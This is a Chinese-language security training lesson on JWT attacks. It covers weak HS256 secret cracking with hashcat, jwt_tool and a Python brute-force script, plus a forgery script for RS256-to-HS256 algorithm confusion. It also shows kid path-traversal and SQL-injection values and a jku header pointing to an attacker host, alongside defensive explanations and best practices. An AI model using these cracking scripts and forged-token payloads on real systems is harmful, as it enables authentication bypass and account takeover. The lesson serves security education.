---
title: Day048：JWT 攻击 - 弱密钥破解与算法混淆
tags:
  - 网络安全
  - JWT
  - 密钥破解
categories:
  - 90天安全突击
stage: 攻坚
abbrlink: d048
date: 2026-03-11
updated: 2026-01-28
---

# Day048：JWT 攻击 - 弱密钥破解与算法混淆

## 基本信息

| 项目 | 内容 |
|------|------|
| **所属阶段** | 攻坚（第二阶段） |
| **所属周次** | Week 8：认证与逻辑漏洞 |
| **今日主题** | JWT 弱密钥与算法混淆攻击 |
| **预计时间** | 3 小时 |
| **难度等级** | 进阶+ |

---

## 今日痛点场景

> **场景**：服务器不接受 none 算法，JWT 必须有签名。但你发现 JWT 使用的是 HS256（对称加密），密钥如果足够弱，是不是可以暴力破解？
>
> **问题**：如何破解 JWT 的密钥？还有什么其他攻击方式？
>
> **今天的任务**：学习 JWT 高级攻击——弱密钥破解和算法混淆。

---

## 今日目标

- [ ] 掌握 JWT 弱密钥暴力破解
- [ ] 理解 RS256 和 HS256 的区别
- [ ] 学会 RS256 to HS256 算法混淆攻击
- [ ] 完成高级 JWT 利用实战

**闯关条件**：成功破解一个 JWT 密钥或完成算法混淆攻击。

---

## 实战任务（先动手！）

### 任务 1：JWT 弱密钥破解原理（20 分钟）

**为什么可以破解？**
```
HS256 签名：HMAC-SHA256(header.payload, secret)

如果我们有：
- 完整的 JWT（header.payload.signature）
- 已知签名算法（HS256）

我们可以：
- 尝试不同的 secret 计算签名
- 如果计算结果 = JWT 中的签名，密钥找到了！
```

**破解条件**：
```
1. JWT 使用对称加密算法（HS256/HS384/HS512）
2. 密钥足够弱（短密码、常见词汇、简单组合）
3. 有足够的计算资源或好的字典
```

**常见弱密钥**：
```
secret
password
123456
jwt
key
admin
[公司名]
[产品名]
```

**记录**：
```
破解的前提条件：________________
```

---

### 任务 2：使用 hashcat 破解 JWT（45 分钟）

**准备工作**：
```bash
# 将 JWT 保存为 hashcat 格式
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c" > jwt.txt
```

**使用 hashcat 破解**：
```bash
# JWT 模式是 16500
hashcat -m 16500 jwt.txt wordlist.txt

# 使用规则增强
hashcat -m 16500 jwt.txt wordlist.txt -r rules/best64.rule

# 暴力破解（短密钥）
hashcat -m 16500 jwt.txt -a 3 ?a?a?a?a?a?a
```

**常用字典**：
```
rockyou.txt
SecLists/Passwords/
自定义 JWT 密钥字典
```

**示例输出**：
```
eyJhbGciOiJIUzI1NiI...SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c:secret

Session..........: hashcat
Status...........: Cracked
```

**记录**：
```
使用的字典：________________
破解出的密钥：________________
破解时间：________________
```

---

### 任务 3：使用 jwt_tool 破解（30 分钟）

**jwt_tool 破解命令**：
```bash
# 字典破解
python jwt_tool.py <jwt> -C -d wordlist.txt

# 输出示例
[+] secret is the CORRECT key!
```

**Python 自己写破解脚本**：
```python
import jwt
import hashlib
import hmac
import base64

def crack_jwt(token, wordlist_path):
    parts = token.split('.')
    header_payload = f"{parts[0]}.{parts[1]}"
    signature = parts[2]

    with open(wordlist_path, 'r') as f:
        for line in f:
            secret = line.strip()
            try:
                # 计算签名
                sig = hmac.new(
                    secret.encode(),
                    header_payload.encode(),
                    hashlib.sha256
                ).digest()
                calculated_sig = base64.urlsafe_b64encode(sig).rstrip(b'=').decode()

                if calculated_sig == signature:
                    print(f"[+] Found secret: {secret}")
                    return secret
            except:
                continue

    print("[-] Secret not found")
    return None

# 使用
jwt_token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"
crack_jwt(jwt_token, "wordlist.txt")
```

**记录**：
```
自己编写的脚本是否成功：________________
```

---

### 任务 4：RS256 to HS256 算法混淆攻击（50 分钟）

**攻击原理**：
```
RS256（非对称）：
- 私钥签名
- 公钥验证

HS256（对称）：
- 同一个密钥签名和验证

如果：
1. 服务器使用 RS256
2. 公钥可以获取
3. 服务器未严格限制算法

攻击：
1. 将算法改为 HS256
2. 用公钥作为 secret 签名
3. 服务器用公钥验证（本应该用私钥）
4. 验证通过！
```

**攻击步骤**：

**步骤 1：获取公钥**
```bash
# 常见公钥泄露位置
/.well-known/jwks.json
/api/v1/keys
/oauth/jwks
```

**步骤 2：转换公钥格式**
```bash
# JWKS 转 PEM
# 在线工具或使用脚本
```

**步骤 3：构造攻击 JWT**
```python
import jwt

# 读取公钥
with open('public.pem', 'r') as f:
    public_key = f.read()

# 伪造 payload
payload = {
    "sub": "1234567890",
    "name": "admin",
    "role": "admin"
}

# 用公钥作为 HS256 的 secret
token = jwt.encode(payload, public_key, algorithm='HS256')
print(token)
```

**jwt_tool 自动攻击**：
```bash
# 自动尝试算法混淆
python jwt_tool.py <jwt> -X k -pk public.pem
```

**记录**：
```
获取公钥的方式：________________
算法混淆攻击结果：________________
```

---

### 任务 5：其他 JWT 攻击技术（35 分钟）

**攻击 1：密钥注入（kid 参数）**
```json
// Header 中的 kid 用于指定密钥
{
  "alg": "HS256",
  "typ": "JWT",
  "kid": "key1"
}

// 如果 kid 用于文件路径查找
{
  "kid": "../../../dev/null"  // 空文件，空密钥
}

// 或 SQL 注入
{
  "kid": "1' UNION SELECT 'secret'--"
}
```

**攻击 2：jku/x5u 头部注入**
```json
// jku: JSON Web Key Set URL
{
  "alg": "RS256",
  "jku": "http://attacker.com/jwks.json"  // 攻击者的密钥
}
```

**攻击 3：过期时间篡改**
```json
// 修改过期时间
{
  "exp": 9999999999,  // 设置很远的未来
  "sub": "admin"
}

// 需要配合签名绕过或弱密钥
```

**攻击 4：敏感信息泄露**
```bash
# JWT Payload 不加密，只编码
# 直接解码可能泄露敏感信息

echo "eyJhbGciOi..." | cut -d. -f2 | base64 -d
```

**记录**：
```
尝试的攻击技术：________________
成功的技术：________________
```

---

## 今日闯关检查

| 检查项 | 分数 |
|--------|------|
| 理解弱密钥破解原理 | 20 分 |
| 成功使用 hashcat 破解 | 25 分 |
| 理解算法混淆原理 | 20 分 |
| 成功执行算法混淆攻击 | 25 分 |
| 了解其他攻击技术 | 10 分 |

**60 分及格，80 分优秀，100 分满分**

你的得分：____

---

## 底层补课

### HS256 vs RS256

```
HS256（HMAC + SHA256）：
- 对称加密
- 签名和验证用同一个密钥
- 速度快
- 密钥管理相对简单

RS256（RSA + SHA256）：
- 非对称加密
- 私钥签名，公钥验证
- 速度慢
- 公钥可以公开分发

安全对比：
- HS256：密钥必须保密，泄露即可伪造
- RS256：只有私钥需要保密，公钥可公开
```

### 为什么算法混淆能成功？

```python
# 漏洞代码
def verify(token):
    header = decode_header(token)
    alg = header.get('alg')  # 从 token 中获取算法

    if alg == 'RS256':
        return jwt.decode(token, public_key, algorithms=['RS256'])
    elif alg == 'HS256':
        return jwt.decode(token, public_key, algorithms=['HS256'])
        # 问题：用公钥作为 HS256 的 secret

# 安全代码
def verify(token):
    # 强制指定算法，忽略 token 中的 alg
    return jwt.decode(token, public_key, algorithms=['RS256'])
```

### JWT 安全最佳实践

```
1. 使用强随机密钥（至少 256 位）
2. 明确指定允许的算法
3. 设置合理的过期时间
4. 不要在 Payload 中存储敏感信息
5. 使用 HTTPS 传输
6. 实现 Token 黑名单（如需撤销）
```

---

## 避坑指南

| 坑点 | 症状 | 解决方案 |
|------|------|----------|
| hashcat 格式错误 | 无法识别 | 确保是完整的 JWT，三段用点分隔 |
| 公钥格式不对 | 签名失败 | 检查 PEM 格式，包含 BEGIN/END 标记 |
| 算法大小写 | 攻击失败 | 尝试 HS256/hs256/hS256 等 |
| 库版本差异 | 行为不一致 | 检查 JWT 库版本和配置 |

---

## 知识卡片速查

### hashcat JWT 模式

```bash
# 模式 16500 = JWT
hashcat -m 16500 jwt.txt wordlist.txt

# 常用参数
-a 0  # 字典攻击
-a 3  # 暴力破解
-r    # 使用规则
-O    # 优化模式
```

### jwt_tool 常用命令

```bash
# 解析
python jwt_tool.py <jwt>

# none 攻击
python jwt_tool.py <jwt> -X a

# 密钥破解
python jwt_tool.py <jwt> -C -d wordlist.txt

# 算法混淆
python jwt_tool.py <jwt> -X k -pk public.pem

# 修改 Payload
python jwt_tool.py <jwt> -T
```

### 常见公钥位置

```
/.well-known/jwks.json
/oauth/discovery/keys
/api/keys
/api/v1/keys
/.well-known/openid-configuration
```

---

## 常见问题

**Q1：破解需要多长时间？**

A1：取决于：
- 密钥复杂度
- 字典质量
- 硬件性能（GPU 加速）
- 简单密钥可能秒破，复杂密钥可能无法破解

**Q2：现代系统还存在这些漏洞吗？**

A2：
- 主流 JWT 库已修复
- 但自己实现的 JWT 验证、老系统、配置错误仍可能存在
- 弱密钥问题永远存在

**Q3：如何防御这些攻击？**

A3：
1. 使用强随机密钥
2. 服务端强制指定算法
3. 禁用 none 算法
4. 使用最新版本的 JWT 库

---

## 明日预告

**Day 049：密码重置漏洞**

明天你将：
- 学习密码重置流程中的常见漏洞
- 掌握重置令牌劫持技术
- 实战密码重置漏洞利用

---

## 学习记录

| 项目 | 内容 |
|------|------|
| 实际学习日期 | |
| 破解出的密钥 | |
| 使用的攻击技术 | |
| 今日收获 | |

---

> **导师点评**：
>
> JWT 攻击的核心是一句话：**安全依赖于密钥的保密性和算法的正确使用**。
>
> 弱密钥 = 没有密钥。用 "secret" 作为密钥，和没有签名没什么区别。
>
> 算法混淆更精妙：它利用的是"过度灵活"——服务器太"听话"了，客户端说用什么算法就用什么。
>
> **安全系统要"固执"，该用什么算法就用什么，不要让客户端来决定**。

```bash
echo "Day 048 Complete! JWT 高级破解解锁！"
```
